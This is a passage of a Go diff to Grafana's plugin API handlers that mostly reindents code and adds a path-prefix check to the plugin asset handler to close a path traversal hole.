\"github.com/grafana/grafana/pkg/plugins\"\n+        \"github.com/grafana/grafana/pkg/plugins/backendplugin\"\n+        \"github.com/grafana/grafana/pkg/plugins/manager/installer\"\n+        \"github.com/grafana/grafana/pkg/setting\"\n+        \"github.com/grafana/grafana/pkg/web\"\n )\n \n func (hs *HTTPServer) GetPluginList(c *models.ReqContext) response.Response {\n-\ttypeFilter := c.Query(\"type\")\n-\tenabledFilter := c.Query(\"enabled\")\n-\tembeddedFilter := c.Query(\"embedded\")\n-\tcoreFilter := c.Query(\"core\")\n-\n-\t// For users with viewer role we only return core plugins\n-\tif !c.HasRole(models.ROLE_ADMIN) {\n-\t\tcoreFilter = \"1\"\n-\t}\n-\n-\tpluginSettingsMap, err := hs.pluginSettings(c.Req.Context(), c.OrgId)\n-\tif err != nil {\n-\t\treturn response.Error(500, \"Failed to get list of plugins\", err)\n-\t}\n-\n-\tresult := make(dtos.PluginList, 0)\n-\tfor _, pluginDef := range hs.pluginStore.Plugins(c.Req.Context()) {\n-\t\t// filter out app sub plugins\n-\t\tif embeddedFilter == \"0\" && pluginDef.IncludedInAppID != \"\" {\n-\t\t\tcontinue\n-\t\t}\n-\n-\t\t// filter out core plugins\n-\t\tif (coreFilter == \"0\" && pluginDef.IsCorePlugin()) || (coreFilter == \"1\" && !pluginDef.IsCorePlugin()) {\n-\t\t\tcontinue\n-\t\t}\n-\n-\t\t// filter on type\n-\t\tif typeFilter != \"\" && typeFilter != string(pluginDef.Type) {\n-\t\t\tcontinue\n-\t\t}\n-\n-\t\tif pluginDef.State == plugins.AlphaRelease && !hs.Cfg.PluginsEnableAlpha {\n-\t\t\tcontinue\n-\t\t}\n-\n-\t\tlistItem := dtos.PluginListItem{\n-\t\t\tId:            pluginDef.ID,\n-\t\t\tName:          pluginDef.Name,\n-\t\t\tType:          string(pluginDef.Type),\n-\t\t\tCategory:      pluginDef.Category,\n-\t\t\tInfo:          pluginDef.Info,\n-\t\t\tDependencies:  pluginDef.Dependencies,\n-\t\t\tLatestVersion: pluginDef.GrafanaComVersion,\n-\t\t\tHasUpdate:     pluginDef.GrafanaComHasUpdate,\n-\t\t\tDefaultNavUrl: pluginDef.DefaultNavURL,\n-\t\t\tState:         pluginDef.State,\n-\t\t\tSignature:     pluginDef.Signature,\n-\t\t\tSignatureType: pluginDef.SignatureType,\n-\t\t\tSignatureOrg:  pluginDef.SignatureOrg,\n-\t\t}\n-\n-\t\tif pluginSetting, exists := pluginSettingsMap[pluginDef.ID]; exists {\n-\t\t\tlistItem.Enabled = pluginSetting.Enabled\n-\t\t\tlistItem.Pinned = pluginSetting.Pinned\n-\t\t}\n-\n-\t\tif listItem.DefaultNavUrl == \"\" || !listItem.Enabled {\n-\t\t\tlistItem.DefaultNavUrl = hs.Cfg.AppSubURL + \"/plugins/\" + listItem.Id + \"/\"\n-\t\t}\n-\n-\t\t// filter out disabled plugins\n-\t\tif enabledFilter == \"1\" && !listItem.Enabled {\n-\t\t\tcontinue\n-\t\t}\n-\n-\t\t// filter out built in plugins\n-\t\tif pluginDef.BuiltIn {\n-\t\t\tcontinue\n-\t\t}\n-\n-\t\tresult = append(result, listItem)\n-\t}\n-\n-\tsort.Sort(result)\n-\treturn response.JSON(200, result)\n+        typeFilter := c.Query(\"type\")\n+        enabledFilter := c.Query(\"enabled\")\n+        embeddedFilter := c.Query(\"embedded\")\n+        coreFilter := c.Query(\"core\")\n+\n+        // For users with viewer role we only return core plugins\n+        if !c.HasRole(models.ROLE_ADMIN) {\n+                coreFilter = \"1\"\n+        }\n+\n+        pluginSettingsMap, err := hs.pluginSettings(c.Req.Context(), c.OrgId)\n+        if err != nil {\n+                return response.Error(500, \"Failed to get list of plugins\", err)\n+        }\n+\n+        result := make(dtos.PluginList, 0)\n+        for _, pluginDef := range hs.pluginStore.Plugins(c.Req.Context()) {\n+                // filter out app sub plugins\n+                if embeddedFilter == \"0\" && pluginDef.IncludedInAppID != \"\" {\n+                        continue\n+                }\n+\n+                // filter out core plugins\n+                if (coreFilter == \"0\" && pluginDef.IsCorePlugin()) || (coreFilter == \"1\" && !pluginDef.IsCorePlugin()) {\n+                        continue\n+                }\n+\n+                // filter on type\n+                if typeFilter != \"\" && typeFilter != string(pluginDef.Type) {\n+                        continue\n+                }\n+\n+                if pluginDef.State == plugins.AlphaRelease && !hs.Cfg.PluginsEnableAlpha {\n+                        continue\n+                }\n+\n+                listItem := dtos.PluginListItem{\n+                        Id:            pluginDef.ID,\n+                        Name:          pluginDef.Name,\n+                        Type:          string(pluginDef.Type),\n+                        Category:      pluginDef.Category,\n+                        Info:          pluginDef.Info,\n+                        Dependencies:  pluginDef.Dependencies,\n+                        LatestVersion: pluginDef.GrafanaComVersion,\n+                        HasUpdate:     pluginDef.GrafanaComHasUpdate,\n+                        DefaultNavUrl: pluginDef.DefaultNavURL,\n+                        State:         pluginDef.State,\n+                        Signature:     pluginDef.Signature,\n+                        SignatureType: pluginDef.SignatureType,\n+                        SignatureOrg:  pluginDef.SignatureOrg,\n+                }\n+\n+                if pluginSetting, exists := pluginSettingsMap[pluginDef.ID]; exists {\n+                        listItem.Enabled = pluginSetting.Enabled\n+                        listItem.Pinned = pluginSetting.Pinned\n+                }\n+\n+                if listItem.DefaultNavUrl == \"\" || !listItem.Enabled {\n+                        listItem.DefaultNavUrl = hs.Cfg.AppSubURL + \"/plugins/\" + listItem.Id + \"/\"\n+                }\n+\n+                // filter out disabled plugins\n+                if enabledFilter == \"1\" && !listItem.Enabled {\n+                        continue\n+                }\n+\n+                // filter out built in plugins\n+                if pluginDef.BuiltIn {\n+                        continue\n+                }\n+\n+                result = append(result, listItem)\n+        }\n+\n+        sort.Sort(result)\n+        return response.JSON(200, result)\n }\n \n func (hs *HTTPServer) GetPluginSettingByID(c *models.ReqContext) response.Response {\n-\tpluginID := web.Params(c.Req)[\":pluginId\"]\n-\n-\tplugin, exists := hs.pluginStore.Plugin(c.Req.Context(), pluginID)\n-\tif !exists {\n-\t\treturn response.Error(404, \"Plugin not found, no installed plugin with that id\", nil)\n-\t}\n-\n-\tdto := &dtos.PluginSetting{\n-\t\tType:          string(plugin.Type),\n-\t\tId:            plugin.ID,\n-\t\tName:          plugin.Name,\n-\t\tInfo:          plugin.Info,\n-\t\tDependencies:  plugin.Dependencies,\n-\t\tIncludes:      plugin.Includes,\n-\t\tBaseUrl:       plugin.BaseURL,\n-\t\tModule:        plugin.Module,\n-\t\tDefaultNavUrl: plugin.DefaultNavURL,\n-\t\tLatestVersion: plugin.GrafanaComVersion,\n-\t\tHasUpdate:     plugin.GrafanaComHasUpdate,\n-\t\tState:         plugin.State,\n-\t\tSignature:     plugin.Signature,\n-\t\tSignatureType: plugin.SignatureType,\n-\t\tSignatureOrg:  plugin.SignatureOrg,\n-\t}\n-\n-\tif plugin.IsApp() {\n-\t\tdto.Enabled = plugin.AutoEnabled\n-\t\tdto.Pinned = plugin.AutoEnabled\n-\t}\n-\n-\tquery := models.GetPluginSettingByIdQuery{PluginId: pluginID, OrgId: c.OrgId}\n-\tif err := bus.DispatchCtx(c.Req.Context(), &query); err != nil {\n-\t\tif !errors.Is(err, models.ErrPluginSettingNotFound) {\n-\t\t\treturn response.Error(500, \"Failed to get login settings\", nil)\n-\t\t}\n-\t} else {\n-\t\tdto.Enabled = query.Result.Enabled\n-\t\tdto.Pinned = query.Result.Pinned\n-\t\tdto.JsonData = query.Result.JsonData\n-\t}\n-\n-\treturn response.JSON(200, dto)\n+        pluginID := web.Params(c.Req)[\":pluginId\"]\n+\n+        plugin, exists := hs.pluginStore.Plugin(c.Req.Context(), pluginID)\n+        if !exists {\n+                return response.Error(404, \"Plugin not found, no installed plugin with that id\", nil)\n+        }\n+\n+        dto := &dtos.PluginSetting{\n+                Type:          string(plugin.Type),\n+                Id:            plugin.ID,\n+                Name:          plugin.Name,\n+                Info:          plugin.Info,\n+                Dependencies:  plugin.Dependencies,\n+                Includes:      plugin.Includes,\n+                BaseUrl:       plugin.BaseURL,\n+                Module:        plugin.Module,\n+                DefaultNavUrl: plugin.DefaultNavURL,\n+                LatestVersion: plugin.GrafanaComVersion,\n+                HasUpdate:     plugin.GrafanaComHasUpdate,\n+                State:         plugin.State,\n+                Signature:     plugin.Signature,\n+                SignatureType: plugin.SignatureType,\n+                SignatureOrg:  plugin.SignatureOrg,\n+        }\n+\n+        if plugin.IsApp() {\n+                dto.Enabled = plugin.AutoEnabled\n+                dto.Pinned = plugin.AutoEnabled\n+        }\n+\n+        query := models.GetPluginSettingByIdQuery{PluginId: pluginID, OrgId: c.OrgId}\n+        if err := bus.DispatchCtx(c.Req.Context(), &query); err != nil {\n+                if !errors.Is(err, models.ErrPluginSettingNotFound) {\n+                        return response.Error(500, \"Failed to get login settings\", nil)\n+                }\n+        } else {\n+                dto.Enabled = query.Result.Enabled\n+                dto.Pinned = query.Result.Pinned\n+                dto.JsonData = query.Result.JsonData\n+        }\n+\n+        return response.JSON(200, dto)\n }\n \n func (hs *HTTPServer) UpdatePluginSetting(c *models.ReqContext) response.Response {\n-\tcmd := models.UpdatePluginSettingCmd{}\n-\tif err := web.Bind(c.Req, &cmd); err != nil {\n-\t\treturn response.Error(http.StatusBadRequest, \"bad request data\", err)\n-\t}\n-\tpluginID := web.Params(c.Req)[\":pluginId\"]\n-\n-\tif _, exists := hs.pluginStore.Plugin(c.Req.Context(), pluginID); !exists {\n-\t\treturn response.Error(404, \"Plugin not installed\", nil)\n-\t}\n-\n-\tcmd.OrgId = c.OrgId\n-\tcmd.PluginId = pluginID\n-\tif err := bus.DispatchCtx(c.Req.Context(), &cmd); err != nil {\n-\t\treturn response.Error(500, \"Failed to update plugin setting\", err)\n-\t}\n-\n-\treturn response.Success(\"Plugin settings updated\")\n+        cmd := models.UpdatePluginSettingCmd{}\n+        if err := web.Bind(c.Req, &cmd); err != nil {\n+                return response.Error(http.StatusBadRequest, \"bad request data\", err)\n+        }\n+        pluginID := web.Params(c.Req)[\":pluginId\"]\n+\n+        if _, exists := hs.pluginStore.Plugin(c.Req.Context(), pluginID); !exists {\n+                return response.Error(404, \"Plugin not installed\", nil)\n+        }\n+\n+        cmd.OrgId = c.OrgId\n+        cmd.PluginId = pluginID\n+        if err := bus.DispatchCtx(c.Req.Context(), &cmd); err != nil {\n+                return response.Error(500, \"Failed to update plugin setting\", err)\n+        }\n+\n+        return response.Success(\"Plugin settings updated\")\n }\n \n func (hs *HTTPServer) GetPluginDashboards(c *models.ReqContext) response.Response {\n-\tpluginID := web.Params(c.Req)[\":pluginId\"]\n+        pluginID := web.Params(c.Req)[\":pluginId\"]\n \n-\tlist, err := hs.pluginDashboardManager.GetPluginDashboards(c.Req.Context(), c.OrgId, pluginID)\n-\tif err != nil {\n-\t\tvar notFound plugins.NotFoundError\n-\t\tif errors.As(err, &notFound) {\n-\t\t\treturn response.Error(404, notFound.Error(), nil)\n-\t\t}\n+        list, err := hs.pluginDashboardManager.GetPluginDashboards(c.Req.Context(), c.OrgId, pluginID)\n+        if err != nil {\n+                var notFound plugins.NotFoundError\n+                if errors.As(err, &notFound) {\n+                        return response.Error(404, notFound.Error(), nil)\n+                }\n \n-\t\treturn response.Error(500, \"Failed to get plugin dashboards\", err)\n-\t}\n+                return response.Error(500, \"Failed to get plugin dashboards\", err)\n+        }\n \n-\treturn response.JSON(200, list)\n+        return response.JSON(200, list)\n }\n \n func (hs *HTTPServer) GetPluginMarkdown(c *models.ReqContext) response.Response {\n-\tpluginID := web.Params(c.Req)[\":pluginId\"]\n-\tname := web.Params(c.Req)[\":name\"]\n-\n-\tcontent, err := hs.pluginMarkdown(c.Req.Context(), pluginID, name)\n-\tif err != nil {\n-\t\tvar notFound plugins.NotFoundError\n-\t\tif errors.As(err, &notFound) {\n-\t\t\treturn response.Error(404, notFound.Error(), nil)\n-\t\t}\n-\n-\t\treturn response.Error(500, \"Could not get markdown file\", err)\n-\t}\n-\n-\t// fallback try readme\n-\tif len(content) == 0 {\n-\t\tcontent, err = hs.pluginMarkdown(c.Req.Context(), pluginID, \"readme\")\n-\t\tif err != nil {\n-\t\t\treturn response.Error(501, \"Could not get markdown file\", err)\n-\t\t}\n-\t}\n-\n-\tresp := response.Respond(200, content)\n-\tresp.SetHeader(\"Content-Type\", \"text/plain; charset=utf-8\")\n-\treturn resp\n+        pluginID := web.Params(c.Req)[\":pluginId\"]\n+        name := web.Params(c.Req)[\":name\"]\n+\n+        content, err := hs.pluginMarkdown(c.Req.Context(), pluginID, name)\n+        if err != nil {\n+                var notFound plugins.NotFoundError\n+                if errors.As(err, &notFound) {\n+                        return response.Error(404, notFound.Error(), nil)\n+                }\n+\n+                return response.Error(500, \"Could not get markdown file\", err)\n+        }\n+\n+        // fallback try readme\n+        if len(content) == 0 {\n+                content, err = hs.pluginMarkdown(c.Req.Context(), pluginID, \"readme\")\n+                if err != nil {\n+                        return response.Error(501, \"Could not get markdown file\", err)\n+                }\n+        }\n+\n+        resp := response.Respond(200, content)\n+        resp.SetHeader(\"Content-Type\", \"text/plain; charset=utf-8\")\n+        return resp\n }\n \n func (hs *HTTPServer) ImportDashboard(c *models.ReqContext) response.Response {\n-\tapiCmd := dtos.ImportDashboardCommand{}\n-\tif err := web.Bind(c.Req, &apiCmd); err != nil {\n-\t\treturn response.Error(http.StatusBadRequest, \"bad request data\", err)\n-\t}\n-\tvar err error\n-\tif apiCmd.PluginId == \"\" && apiCmd.Dashboard == nil {\n-\t\treturn response.Error(422, \"Dashboard must be set\", nil)\n-\t}\n-\n-\tlimitReached, err := hs.QuotaService.QuotaReached(c, \"dashboard\")\n-\tif err != nil {\n-\t\treturn response.Error(500, \"failed to get quota\", err)\n-\t}\n-\tif limitReached {\n-\t\treturn response.Error(403, \"Quota reached\", nil)\n-\t}\n-\n-\ttrimDefaults := c.QueryBoolWithDefault(\"trimdefaults\", true)\n-\tif trimDefaults && !hs.LoadSchemaService.IsDisabled() {\n-\t\tapiCmd.Dashboard, err = hs.LoadSchemaService.DashboardApplyDefaults(apiCmd.Dashboard)\n-\t\tif err != nil {\n-\t\t\treturn response.Error(500, \"Error while applying default value to the dashboard json\", err)\n-\t\t}\n-\t}\n-\n-\tdashInfo, dash, err := hs.pluginDashboardManager.ImportDashboard(c.Req.Context(), apiCmd.PluginId, apiCmd.Path, c.OrgId, apiCmd.FolderId,\n-\t\tapiCmd.Dashboard, apiCmd.Overwrite, apiCmd.Inputs, c.SignedInUser)\n-\tif err != nil {\n-\t\treturn hs.dashboardSaveErrorToApiResponse(c.Req.Context(), err)\n-\t}\n-\n-\terr = hs.LibraryPanelService.ImportLibraryPanelsForDashboard(c.Req.Context(), c.SignedInUser, dash, apiCmd.FolderId)\n-\tif err != nil {\n-\t\treturn response.Error(500, \"Error while importing library panels\", err)\n-\t}\n-\n-\terr = hs.LibraryPanelService.ConnectLibraryPanelsForDashboard(c.Req.Context(), c.SignedInUser, dash)\n-\tif err != nil {\n-\t\treturn response.Error(500, \"Error while connecting library panels\", err)\n-\t}\n-\n-\treturn response.JSON(200, dashInfo)\n+        apiCmd := dtos.ImportDashboardCommand{}\n+        if err := web.Bind(c.Req, &apiCmd); err != nil {\n+                return response.Error(http.StatusBadRequest, \"bad request data\", err)\n+        }\n+        var err error\n+        if apiCmd.PluginId == \"\" && apiCmd.Dashboard == nil {\n+                return response.Error(422, \"Dashboard must be set\", nil)\n+        }\n+\n+        limitReached, err := hs.QuotaService.QuotaReached(c, \"dashboard\")\n+        if err != nil {\n+                return response.Error(500, \"failed to get quota\", err)\n+        }\n+        if limitReached {\n+                return response.Error(403, \"Quota reached\", nil)\n+        }\n+\n+        trimDefaults := c.QueryBoolWithDefault(\"trimdefaults\", true)\n+        if trimDefaults && !hs.LoadSchemaService.IsDisabled() {\n+                apiCmd.Dashboard, err = hs.LoadSchemaService.DashboardApplyDefaults(apiCmd.Dashboard)\n+                if err != nil {\n+                        return response.Error(500, \"Error while applying default value to the dashboard json\", err)\n+                }\n+        }\n+\n+        dashInfo, dash, err := hs.pluginDashboardManager.ImportDashboard(c.Req.Context(), apiCmd.PluginId, apiCmd.Path, c.OrgId, apiCmd.FolderId,\n+                apiCmd.Dashboard, apiCmd.Overwrite, apiCmd.Inputs, c.SignedInUser)\n+        if err != nil {\n+                return hs.dashboardSaveErrorToApiResponse(c.Req.Context(), err)\n+        }\n+\n+        err = hs.LibraryPanelService.ImportLibraryPanelsForDashboard(c.Req.Context(), c.SignedInUser, dash, apiCmd.FolderId)\n+        if err != nil {\n+                return response.Error(500, \"Error while importing library panels\", err)\n+        }\n+\n+        err = hs.LibraryPanelService.ConnectLibraryPanelsForDashboard(c.Req.Context(), c.SignedInUser, dash)\n+        if err != nil {\n+                return response.Error(500, \"Error while connecting library panels\", err)\n+        }\n+\n+        return response.JSON(200, dashInfo)\n }\n \n // CollectPluginMetrics collect metrics from a plugin.\n //\n // /api/plugins/:pluginId/metrics\n func (hs *HTTPServer) CollectPluginMetrics(c *models.ReqContext) response.Response {\n-\tpluginID := web.Params(c.Req)[\":pluginId\"]\n-\tplugin, exists := hs.pluginStore.Plugin(c.Req.Context(), pluginID)\n-\tif !exists {\n-\t\treturn response.Error(404, \"Plugin not found\", nil)\n-\t}\n+        pluginID := web.Params(c.Req)[\":pluginId\"]\n+        plugin, exists := hs.pluginStore.Plugin(c.Req.Context(), pluginID)\n+        if !exists {\n+                return response.Error(404, \"Plugin not found\", nil)\n+        }\n \n-\tresp, err := hs.pluginClient.CollectMetrics(c.Req.Context(), plugin.ID)\n-\tif err != nil {\n-\t\treturn translatePluginRequestErrorToAPIError(err)\n-\t}\n+        resp, err := hs.pluginClient.CollectMetrics(c.Req.Context(), plugin.ID)\n+        if err != nil {\n+                return translatePluginRequestErrorToAPIError(err)\n+        }\n \n-\theaders := make(http.Header)\n-\theaders.Set(\"Content-Type\", \"text/plain\")\n+        headers := make(http.Header)\n+        headers.Set(\"Content-Type\", \"text/plain\")\n \n-\treturn response.CreateNormalResponse(headers, resp.PrometheusMetrics, http.StatusOK)\n+        return response.CreateNormalResponse(headers, resp.PrometheusMetrics, http.StatusOK)\n }\n \n // getPluginAssets returns public plugin assets (images, JS, etc.)\n //\n // /public/plugins/:pluginId/*\n func (hs *HTTPServer) getPluginAssets(c *models.ReqContext) {\n-\tpluginID := web.Params(c.Req)[\":pluginId\"]\n-\tplugin, exists := hs.pluginStore.Plugin(c.Req.Context(), pluginID)\n-\tif !exists {\n-\t\tc.JsonApiErr(404, \"Plugin not found\", nil)\n-\t\treturn\n-\t}\n-\n-\trequestedFile := filepath.Clean(web.Params(c.Req)[\"*\"])\n-\tpluginFilePath := filepath.Join(plugin.PluginDir, requestedFile)\n-\n-\tif !plugin.IncludedInSignature(requestedFile) {\n-\t\ths.log.Warn(\"Access to requested plugin file will be forbidden in upcoming Grafana versions as the file \"+\n-\t\t\t\"is not included in the plugin signature\", \"file\", requestedFile)\n-\t}\n-\n-\t// It's safe to ignore gosec warning G304 since we already clean the requested file path and subsequently\n-\t// use this with a prefix of the plugin's directory, which is set during plugin loading\n-\t// nolint:gosec\n-\tf, err := os.Open(pluginFilePath)\n-\tif err != nil {\n-\t\tif os.IsNotExist(err) {\n-\t\t\tc.JsonApiErr(404, \"Plugin file not found\", err)\n-\t\t\treturn\n-\t\t}\n-\t\tc.JsonApiErr(500, \"Could not open plugin file\", err)\n-\t\treturn\n-\t}\n-\tdefer func() {\n-\t\tif err := f.Close(); err != nil {\n-\t\t\ths.log.Error(\"Failed to close file\", \"err\", err)\n-\t\t}\n-\t}()\n-\n-\tfi, err := f.Stat()\n-\tif err != nil {\n-\t\tc.JsonApiErr(500, \"Plugin file exists but could not open\", err)\n-\t\treturn\n-\t}\n-\n-\tif hs.Cfg.Env == setting.Dev {\n-\t\tc.Resp.Header().Set(\"Cache-Control\", \"max-age=0, must-revalidate, no-cache\")\n-\t} else {\n-\t\tc.Resp.Header().Set(\"Cache-Control\", \"public, max-age=3600\")\n-\t}\n-\n-\thttp.ServeContent(c.Resp, c.Req, pluginFilePath, fi.ModTime(), f)\n+        pluginID := web.Params(c.Req)[\":pluginId\"]\n+        plugin, exists := hs.pluginStore.Plugin(c.Req.Context(), pluginID)\n+        if !exists {\n+                c.JsonApiErr(404, \"Plugin not found\", nil)\n+                return\n+        }\n+\n+        requestedFile := web.Params(c.Req)[\"*\"]\n+        // Use a cleaned requested file path to supply to the file system\n+        // and to prevent a path traversal vulnerability.\n+        pluginFilePath := filepath.Clean(filepath.Join(plugin.PluginDir, requestedFile))\n+        if !strings.HasPrefix(pluginFilePath, filepath.Clean(plugin.PluginDir)) {\n+                c.JsonApiErr(404, \"Plugin file not found\", nil)\n+                return\n+        }\n+\n+        if !plugin.IncludedInSignature(requestedFile) {\n+                hs.log.Warn(\"Access to requested plugin file will be forbidden in upcoming Grafana versions as the file \"+\n+                        \"is not included in the plugin signature\", \"file\", requestedFile)\n+        }\n+\n+        // It's safe to ignore gosec warning G304 since we already clean the requested file path and subsequently\n+        // use this with a prefix of the plugin's directory, which is set during plugin loading\n+        // nolint:gosec\n+        f, err := os.Open(pluginFilePath)\n+        if err != nil {\n+                if os.IsNotExist(err) {\n+                        c.JsonApiErr(404, \"Plugin file not found\", err)\n+                        return\n+                }\n+                c.JsonApiErr(500, \"Could not open plugin file\", err)\n+                return\n+        }\n+        defer func() {\n+                if err := f.Close(); err != nil {\n+                        hs.log.Error(\"Failed to close file\", \"err\", err)\n+                }\n+        }()\n+\n+        fi, err := f.Stat()\n+        if err != nil {\n+                c.JsonApiErr(500, \"Plugin file exists but could not open\", err)\n+                return\n+        }\n+\n+        if hs.Cfg.Env == setting.Dev {\n+                c.Resp.Header().Set(\"Cache-Control\", \"max-age=0, must-revalidate, no-cache\")\n+        } else {\n+                c.Resp.Header().Set(\"Cache-Control\", \"public, max-age=3600\")\n+        }\n+\n+        http.ServeContent(c.Resp, c.Req, pluginFilePath, fi.ModTime(), f)\n }\n \n // CheckHealth returns the health of a plugin.\n // /api/plugins/:pluginId/health\n func (hs *HTTPServer) CheckHealth(c *models.ReqContext) response.Response {\n-\tpluginID := web.Params(c.Req)[\":pluginId\"]\n-\n-\tpCtx, found, err := hs.PluginContextProvider.Get(c.Req.Context(), pluginID, \"\", c.SignedInUser, false)\n-\tif err != nil {\n-\t\treturn response.Error(500, \"Failed to get plugin settings\", err)\n-\t}\n-\tif !found {\n-\t\treturn response.Error(404, \"Plugin not found\", nil)\n-\t}\n-\n-\tresp, err := hs.pluginClient.CheckHealth(c.Req.Context(), &backend.CheckHealthRequest{\n-\t\tPluginContext: pCtx,\n-\t})\n-\tif err != nil {\n-\t\treturn translatePluginRequestErrorToAPIError(err)\n-\t}\n-\n-\tpayload := map[string]interface{}{\n-\t\t\"status\":  resp.Status.String(),\n-\t\t\"message\": resp.Message,\n-\t}\n-\n-\t// Unmarshal JSONDetails if it's not empty.\n-\tif len(resp.JSONDetails) > 0 {\n-\t\tvar jsonDetails map[string]interface{}\n-\t\terr = json.Unmarshal(resp.JSONDetails, &jsonDetails)\n-\t\tif err != nil {\n-\t\t\treturn response.Error(500, \"Failed to unmarshal detailed response from backend plugin\", err)\n-\t\t}\n-\n-\t\tpayload[\"details\"] = jsonDetails\n-\t}\n-\n-\tif resp.Status != backend.HealthStatusOk {\n-\t\treturn response.JSON(503, payload)\n-\t}\n-\n-\treturn response.JSON(200, payload)\n+        pluginID := web.Params(c.Req)[\":pluginId\"]\n+\n+        pCtx, found, err := hs.PluginContextProvider.Get(c.Req.Context(), pluginID, \"\", c.SignedInUser, false)\n+        if err != nil {\n+                return response.Error(500, \"Failed to get plugin settings\", err)\n+        }\n+        if !found {\n+                return response.Error(404, \"Plugin not found\", nil)\n+        }\n+\n+        resp, err := hs.pluginClient.CheckHealth(c.Req.Context(), &backend.CheckHealthRequest{\n+                PluginContext: pCtx,\n+        })\n+        if err != nil {\n+                return translatePluginRequestErrorToAPIError(err)\n+        }\n+\n+        payload := map[string]interface{}{\n+                \"status\":  resp.Status.String(),\n+                \"message\": resp.Message,\n+        }\n+\n+        // Unmarshal JSONDetails if it's not empty.\n+        if len(resp.JSONDetails) > 0 {\n+                var jsonDetails map[string]interface{}\n+                err = json.Unmarshal(resp.JSONDetails, &jsonDetails)\n+                if err != nil {\n+                        return response.Error(500, \"Failed to unmarshal detailed response from backend plugin\", err)\n+                }\n+\n+                payload[\"details\"] = jsonDetails\n+        }\n+\n+        if resp.Status != backend.HealthStatusOk {\n+                return response.JSON(503, payload)\n+        }\n+\n+        return response.JSON(200, payload)\n }\n \n // CallResource passes a resource call from a plugin to the backend plugin.\n //\n // /api/plugins/:pluginId/resources/*\n func (hs *HTTPServer) CallResource(c *models.ReqContext) {\n-\tpluginID := web.Params(c.Req)[\":pluginId\"]\n-\n-\tpCtx, found, err := hs.PluginContextProvider.Get(c.Req.Context(), pluginID, \"\", c.SignedInUser, false)\n-\tif err != nil {\n-\t\tc.JsonApiErr(500, \"Failed to get plugin settings\", err)\n-\t\treturn\n-\t}\n-\tif !found {\n-\t\tc.JsonApiErr(404, \"Plugin not found\", nil)\n-\t\treturn\n-\t}\n-\ths.pluginClient.CallResource(pCtx, c, web.Params(c.Req)[\"*\"])\n+        pluginID := web.Params(c.Req)[\":pluginId\"]\n+\n+        pCtx, found, err := hs.PluginContextProvider.Get(c.Req.Context(), pluginID, \"\", c.SignedInUser, false)\n+        if err != nil {\n+                c.JsonApiErr(500, \"Failed to get plugin settings\", err)\n+                return\n+        }\n+        if !found {\n+                c.JsonApiErr(404, \"Plugin not found\", nil)\n+                return\n+        }\n+        hs.pluginClient.CallResource(pCtx, c, web.Params(c.Req)[\"*\"])\n }\n \n func (hs *HTTPServer) GetPluginErrorsList(_ *models.ReqContext) response.Response {\n-\treturn response.JSON(200, hs.pluginErrorResolver.PluginErrors())\n+        return response.JSON(200, hs.pluginErrorResolver.PluginErrors())\n }\n \n func (hs *HTTPServer) InstallPlugin(c *models.ReqContext) response.Response {\n-\tdto := dtos.InstallPluginCommand{}\n-\tif err := web.Bind(c.Req, &dto); err != nil {\n-\t\treturn response.Error(http.StatusBadRequest, \"bad request data\", err)\n-\t}\n-\tpluginID := web.Params(c.Req)[\":pluginId\"]\n-\n-\terr := hs.pluginStore.Add(c.Req.Context(), pluginID, dto.Version, plugins.AddOpts{})\n-\tif err != nil {\n-\t\tvar dupeErr plugins.DuplicateError\n-\t\tif errors.As(err, &dupeErr) {\n-\t\t\treturn response.Error(http.StatusConflict, \"Plugin already installed\", err)\n-\t\t}\n-\t\tvar versionUnsupportedErr installer.ErrVersionUnsupported\n-\t\tif errors.As(err, &versionUnsupportedErr) {\n-\t\t\treturn response.Error(http.StatusConflict, \"Plugin version not supported\", err)\n-\t\t}\n-\t\tvar versionNotFoundErr installer.ErrVersionNotFound\n-\t\tif errors.As(err, &versionNotFoundErr) {\n-\t\t\treturn response.Error(http.StatusNotFound, \"Plugin version not found\", err)\n-\t\t}\n-\t\tvar clientError installer.Response4xxError\n-\t\tif errors.As(err, &clientError) {\n-\t\t\treturn response.Error(clientError.StatusCode, clientError.Message, err)\n-\t\t}\n-\t\tif errors.Is(err, plugins.ErrInstallCorePlugin) {\n-\t\t\treturn response.Error(http.StatusForbidden, \"Cannot install or change a Core plugin\", err)\n-\t\t}\n-\n-\t\treturn response.Error(http.StatusInternalServerError, \"Failed to install plugin\", err)\n-\t}\n-\n-\treturn response.JSON(http.StatusOK, []byte{})\n+        dto := dtos.InstallPluginCommand{}\n+        if err := web.Bind(c.Req, &dto); err != nil {\n+                return response.Error(http.StatusBadRequest, \"bad request data\", err)\n+        }\n+        pluginID := web.Params(c.Req)[\":pluginId\"]\n+\n+        err := hs.pluginStore.Add(c.Req.Context(), pluginID, dto.Version, plugins.AddOpts{})\n+        if err != nil {\n+                var dupeErr plugins.DuplicateError\n+                if errors.As(err, &dupeErr) {\n+                        return response.Error(http.StatusConflict, \"Plugin already installed\", err)\n+                }\n+                var versionUnsupportedErr installer.ErrVersionUnsupported\n+                if errors.As(err, &versionUnsupportedErr) {\n+                        return response.Error(http.StatusConflict, \"Plugin version not supported\", err)\n+                }\n+                var versionNotFoundErr installer.ErrVersionNotFound\n+                if errors.As(err, &versionNotFoundErr) {\n+                        return response.Error(http.StatusNotFound, \"Plugin version not found\", err)\n+                }\n+                var clientError installer.Response4xxError\n+                if errors.As(err, &clientError) {\n+                        return response.Error(clientError.StatusCode, clientError.Message, err)\n+                }\n+                if errors.Is(err, plugins.ErrInstallCorePlugin) {\n+                        return response.Error(http.StatusForbidden, \"Cannot install or change a Core plugin\", err)\n+                }\n+\n+                return response.Error(http.StatusInternalServerError, \"Failed to install plugin\", err)\n+        }\n+\n+        return response.JSON(http.StatusOK, []byte{})\n }\n \n func (hs *HTTPServer) UninstallPlugin(c *models.ReqContext) response.Response {\n-\tpluginID := web.Params(c.Req)[\":pluginId\"]\n-\n-\terr := hs.pluginStore.Remove(c.Req.Context(), pluginID)\n-\tif err != nil {\n-\t\tif errors.Is(err, plugins.ErrPluginNotInstalled) {\n-\t\t\treturn response.Error(http.StatusNotFound, \"Plugin not installed\", err)\n-\t\t}\n-\t\tif errors.Is(err, plugins.ErrUninstallCorePlugin) {\n-\t\t\treturn response.Error(http.StatusForbidden, \"Cannot uninstall a Core plugin\", err)\n-\t\t}\n-\t\tif errors.Is(err, plugins.ErrUninstallOutsideOfPluginDir) {\n-\t\t\treturn response.Error(http.StatusForbidden, \"Cannot uninstall a plugin outside of the plugins directory\", err)\n-\t\t}\n-\n-\t\treturn response.Error(http.StatusInternalServerError, \"Failed to uninstall plugin\", err)\n-\t}\n-\treturn response.JSON(http.StatusOK, []byte{})\n+        pluginID := web.Params(c.Req)[\":pluginId\"]\n+\n+        err 